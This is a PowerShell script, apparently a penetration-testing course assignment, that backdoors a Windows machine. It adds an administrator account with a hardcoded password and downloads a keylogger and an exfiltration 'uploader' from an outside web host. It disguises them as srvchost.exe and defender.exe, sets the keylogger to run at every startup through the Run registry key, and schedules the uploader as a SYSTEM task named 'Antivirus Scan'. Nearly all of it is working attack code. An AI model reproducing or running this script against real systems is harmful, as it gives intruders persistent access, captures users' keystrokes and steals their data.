# Kyle Healy
# CPSC62700 - Penetration Testing
# 2/20/2019

#Script to create a back door, execute a program on all user startups, and 
# execute a separate program at a scheduled time.

function createBackdoorAccount {
    net user poweruser 1qA2wS3eD /add 
    net localgroup "Admins" /add
    net localgroup Administrators "Admins" /add
    net localgroup "Admins" poweruser /add
}

function downloadPrograms {
    $destFolder = "C:\temp"
    if (-Not (Test-Path -Path $destFolder )) {
        New-Item -ItemType directory -Path $destFolder
    }
    $keyloggerUrl = "http://front.cs.lewisu.edu/~perryjn/klog.exe"
    $keyloggerDest = "C:\temp\srvchost.exe"
    $uploaderUrl = "http://front.cs.lewisu.edu/~perryjn/uploader.exe"
    $uploaderDest = "C:\temp\defender.exe"
    $wsclient = New-Object System.Net.WebClient
    $wsclient.DownloadFile($keyloggerUrl, $keyloggerDest)
    $wsclient.DownloadFile($uploaderUrl, $uploaderDest)
}

function addKeyloggerToUsersStartUp {
    $regpath = "HKLM:\Software\Microsoft\Windows\CurrentVersion\Run"
    $appPath = "C:\temp\srvchost.exe"
    $name = "srvchost"
    Set-ItemProperty -Path $regpath -Name $name -Value $appPath
}

function scheduleTask {
    $name = "Antivirus Scan"
    $appPath = "C:\temp\defender.exe"
    schtasks.exe /create /s localhost /ru System /tn $name /tr $appPath /sc DAILY /st 02:00 
}

# Task 1 - Create a back Door
createBackdoorAccount

# Task 2 - Download a Keylogger and an Exfiltration program
downloadPrograms

# Task 3 - Set the Keylogger to run at every user's startup
addKeyloggerToUsersStartUp

# Task 4 - Create a scheduled job for the exfiltration program
scheduleTask
